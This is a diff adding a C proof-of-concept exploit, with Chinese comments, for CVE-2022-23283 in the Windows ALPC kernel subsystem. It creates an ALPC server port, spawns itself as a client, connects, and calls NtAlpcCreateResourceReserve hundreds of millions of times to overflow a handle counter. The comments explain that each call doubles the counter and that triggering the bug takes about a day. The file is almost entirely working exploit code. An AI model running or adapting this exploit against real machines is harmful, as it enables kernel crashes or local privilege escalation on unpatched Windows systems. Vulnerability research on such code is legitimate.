@@ -1,0 +1,253 @@
+//alpc  NtAlpcCreateResourceReserve 此代码也是 CVE-2022-23283的概念证明，触发这个漏洞需要至少一天的时间
+
+#include <windows.h>
+#include <stdio.h>
+#include <windef.h>
+#include <Psapi.h>
+#include <winternl.h>
+#include"alpc.h"
+#include<sddl.h>
+#pragma comment(lib, "ntdll")
+
+#pragma warning(disable:4996)
+
+ALPC_DATA_VIEW_ATTR viewAttr;
+#define MSG_LEN 0x400
+
+PALPC_MESSAGE_ATTRIBUTES alloc_message_attribute(ULONG ulAttributeFlags) {
+	NTSTATUS lSuccess;
+	PALPC_MESSAGE_ATTRIBUTES pAttributeBuffer;
+	LPVOID lpBuffer;
+	SIZE_T lpReqBufSize;
+	SIZE_T ulAllocBufSize;
+
+	ulAllocBufSize = AlpcGetHeaderSize(ulAttributeFlags); // this calculates: sizeof(ALPC_MESSAGE_ATTRIBUTES) + size of attribute structures
+	lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulAllocBufSize);
+	if (GetLastError() != 0) {
+		wprintf(L"[-] Failed to allocate memory for ALPC Message attributes.\n");
+		return NULL;
+	}
+	pAttributeBuffer = (PALPC_MESSAGE_ATTRIBUTES)lpBuffer;
+	//wprintf(L"[*] Initializing ReceiveMessage Attributes (0x%X)...", ulAttributeFlags);
+	lSuccess = AlpcInitializeMessageAttribute(
+		ulAttributeFlags,	// attributes
+		pAttributeBuffer,	// pointer to attributes structure
+		ulAllocBufSize,	// buffer size
+		&lpReqBufSize
+	);
+	if (!NT_SUCCESS(lSuccess)) {
+		//wprintf(L"Error: 0x%X\n", lSuccess);
+		//pAttributeBuffer->ValidAttributes = ulAttributeFlags;
+		return NULL;
+	}
+	else {
+		//wprintf(L"Success.\n");
+		return pAttributeBuffer;
+	}
+}
+
+PSECURITY_DESCRIPTOR create_sd_from_string(LPCWSTR szDACL) {
+	PSECURITY_DESCRIPTOR pSD;
+	ULONG ulSDSize = 0;
+	BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptor(
+		szDACL,
+		SDDL_REVISION_1,
+		&pSD,
+		&ulSDSize
+	);
+	return pSD;
+}
+
+PPORT_MESSAGE CreateMsgMem(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)
+{
+	PPORT_MESSAGE lpMem = (PPORT_MESSAGE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + sizeof(PORT_MESSAGE));
+	memmove(lpMem, PortMessage, sizeof(PORT_MESSAGE));
+	memmove((BYTE*)lpMem + sizeof(PORT_MESSAGE), Message, MessageSize);
+	return(lpMem);
+}
+
+ULONG adder;
+
+
+HANDLE hConnectionPort = NULL;
+HANDLE handle = NULL;
+PALPC_MESSAGE_ATTRIBUTES pMsgAttrReceived = NULL;
+PORT_MESSAGE     pmReceived = { 0 };
+
+INT main()
+{
+	//
+// DEFINITIONS
+//
+	NTSTATUS lSuccess;
+	HANDLE hCommunicationPort= NULL;
+	UNICODE_STRING usAlpcPortName;
+	OBJECT_ATTRIBUTES objAttributes;
+	ALPC_PORT_ATTRIBUTES PortAttributes;
+	SECURITY_QUALITY_OF_SERVICE SecurityQos;
+	
+	SIZE_T ulReceivedSize = MSG_LEN;
+	PALPC_MESSAGE_ATTRIBUTES pMsgAttrSend;
+	
+	LPCWSTR pwsPortName = L"\\RPC Control\\CSALPCPort"; // the name of the ALPC port we're creating
+	CS_PORT_CONTEXT portContext;
+	UUID uuid;
+	BOOL bAttemptImpersonation = TRUE;
+	DWORD dwPID = GetCurrentProcessId();
+	DWORD dwTID = GetCurrentThreadId();
+	LARGE_INTEGER time = { 0 };
+	time.HighPart = 0xffffffff;
+	pMsgAttrReceived = alloc_message_attribute(ALPC_MESSAGE_ATTRIBUTE_ALL);
+	// QOS
+	RtlZeroMemory(&SecurityQos, sizeof(SECURITY_QUALITY_OF_SERVICE));
+		SecurityQos.ImpersonationLevel = SecurityImpersonation; // SecurityImpersonation; 
+	SecurityQos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
+	SecurityQos.EffectiveOnly = 0;
+	SecurityQos.Length = sizeof(SecurityQos);
+	// ALPC Port Attributs
+	PortAttributes.Flags = ALPC_PORTFLG_ALLOW_DUP_OBJECT | ALPC_PORTFLG_ALLOWIMPERSONATION | ALPC_PORTFLG_LRPC_WAKE_POLICY1 | ALPC_PORTFLG_LRPC_WAKE_POLICY2 | ALPC_PORTFLG_LRPC_WAKE_POLICY3; //0xb84a3f0;// ALPC_PORTFLG_ALLOW_DUP_OBJECT | ALPC_PORTFLG_AllowImpersonation | ALPC_PORTFLG_LRPC_WAKE_POLICY1 | ALPC_PORTFLG_LRPC_WAKE_POLICY2 | ALPC_PORTFLG_LRPC_WAKE_POLICY3; // ; //0x8080000;// ALPC_PORFLG_ALLOW_LPC_REQUESTS;// ALPC_PORFLG_ALLOW_LPC_REQUESTS;// | ALPC_PORFLG_SYSTEM_PROCESS;//0x010000 | 0x020000;	// Found '0x3080000' in rpcrt4.dll
+	PortAttributes.MaxMessageLength = MSG_LEN; // technically the hard limit for this is 65535, if no constrains you can use AlpcMaxAllowedMessageLength() to set this limit
+	PortAttributes.MaxSectionSize = 0xffffffff; // 20000; 
+	PortAttributes.MaxViewSize = 0xffffffff; // 20000; // sizeof(PORT_VIEW); 
+	PortAttributes.MaxTotalSectionSize = 0xffffffff;// 20000;
+	PortAttributes.DupObjectTypes = 0xffffffff;
+	PortAttributes.MaxPoolUsage = 0xffffffff; // 0x4000;
+	RtlSecureZeroMemory(&SecurityQos, sizeof(SecurityQos));
+	PortAttributes.SecurityQos = SecurityQos;
+	PortAttributes.Reserved = 0x200000;
+	
+	// 
+	// CREATE PORT
+	//
+	RtlInitUnicodeString(&usAlpcPortName, pwsPortName);	// Initialize Unicode String
+	InitializeObjectAttributes(						// set up OBJECT_ATTRIBUTES structure
+		&objAttributes,		// the pointer to the OBJECT_ATTRIBUTES structure
+		&usAlpcPortName,	// the name the object we want to obtain a handle for
+		0,					// no flags, ref.: https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes
+		NULL,				// no root directry handle as our port name is a full qualified path
+		NULL//pSD				// security descriptor
+	);
+	
+	handle = OpenEventW(EVENT_ALL_ACCESS, 0, L"Global\\hi");
+	//如果没有打开事件成功说明没有创建alpc端口 说明自身是服务端 然后再创建一个客户端进程
+	if (!handle) {
+		handle = CreateEventW(0, 0, 0, L"Global\\hi");
+		wprintf(L"[+] Starting Server. PID: %d | TID: %d\n", dwPID, dwTID);
+		lSuccess = NtAlpcCreatePort(
+			&hConnectionPort,			// the handle to our port name
+			&objAttributes,		// the OBJECT_ATTRIBUTES structure we just initialized
+			&PortAttributes //0 				// additional port attributes
+		);
+		if (!NT_SUCCESS(lSuccess)) {
+			wprintf(L"[-] Creating ALPC Port '%s'...  Error: 0x%X\n", lSuccess);
+
+			return 1;
+		}
+		else wprintf(L"[+] Creating ALPC Port '%s' Success \n", pwsPortName);
+
+
+		
+		
+
+		PROCESS_INFORMATION pi = { 0 };
+		STARTUPINFOEXA si = { sizeof(si) };
+
+		char szModule[MAX_PATH];
+		GetModuleFileNameA(NULL, szModule, MAX_PATH);
+		
+		BOOL success = CreateProcessA(
+			NULL,
+			(LPSTR)szModule,
+			nullptr, nullptr, FALSE,
+			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr,
+			(LPSTARTUPINFOA)&si,
+			&pi
+		);
+
+		DWORD           szInput[MSG_LEN + 1];
+		RtlSecureZeroMemory(&pmReceived, sizeof(pmReceived));
+		RtlSecureZeroMemory(&szInput, MSG_LEN);
+
+		pmReceived.u1.s1.DataLength = MSG_LEN - 0x28;
+		pmReceived.u1.s1.TotalLength = MSG_LEN;
+		PPORT_MESSAGE lpMem = CreateMsgMem(&pmReceived, pmReceived.u1.s1.DataLength, &szInput);
+
+		lSuccess = NtAlpcSendWaitReceivePort(
+			hConnectionPort,
+			NULL,
+			NULL,		// SendMessage_
+			NULL,		// SendMessageAttributes
+			lpMem,	// ReceiveBuffer
+			NULL,		// BufferLength
+			NULL,//&test,		// ReceiveMessageAttributes
+			NULL			// no timeout
+		);
+
+		
+		lSuccess = NtAlpcAcceptConnectPort(
+			&hCommunicationPort,		// Communication port handle
+			hConnectionPort,			// Connection port handle
+			NULL,		// connection flags
+			NULL,						// no object attributs
+			&PortAttributes, //0,		// port attributes
+			&portContext,				// port context
+			lpMem,	// connection request
+			NULL,				// connection message attributes
+			1			// accepting the connection
+		);
+		if (!NT_SUCCESS(lSuccess)) {
+			wprintf(L"[-] Connect Error: 0x%X\n", lSuccess);
+			exit(-1);
+		}
+		else wprintf(L"[+] Connect Done\n");
+
+
+
+	}
+	else
+	{
+		
+		wprintf(L"[+] Starting client. PID: %d | TID: %d\n", dwPID, dwTID);
+		DWORD           szInput[MSG_LEN + 1];
+		
+		
+		RtlSecureZeroMemory(&pmReceived, sizeof(pmReceived));
+		RtlSecureZeroMemory(&szInput, MSG_LEN);
+		memset(szInput,0x41,MSG_LEN);
+		
+		pmReceived.u1.s1.DataLength = MSG_LEN - 0x28;
+		pmReceived.u1.s1.TotalLength = MSG_LEN;
+		PPORT_MESSAGE lpMem = CreateMsgMem(&pmReceived, pmReceived.u1.s1.DataLength, &szInput);
+		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
+		
+
+
+		lSuccess = NtAlpcConnectPort(&hConnectionPort, &usAlpcPortName, 0, &PortAttributes, NULL, NULL, lpMem, NULL, NULL, NULL, NULL);
+
+
+		if (!NT_SUCCESS(lSuccess)) {
+			wprintf(L"[-] NtAlpcConnectPort Error: 0x%X.\n", lSuccess);
+			exit(-1);
+
+		}
+		else {
+			wprintf(L"[+] NtAlpcConnectPort Success.\n");
+		}
+
+	
+		ALPC_HANDLE hd;
+	
+  //设置TotalHandles字段可以调用NtAlpcCreateResourceReserve，该字段以0x10>>0x20>>0x40>>0x80>>0x100>>....相乘二的规律依次类记，
+  //所以只需要调用足够多次数的NtAlpcCreateResourceReserve就能造成溢出
+		for (size_t i = 0; i < 0x20000000; i++)
+		{
+	
+			NtAlpcCreateResourceReserve(hConnectionPort, 0, 0x30, &hd);
+	
+		}
+	}
+	
+
+	getchar();
+
+}
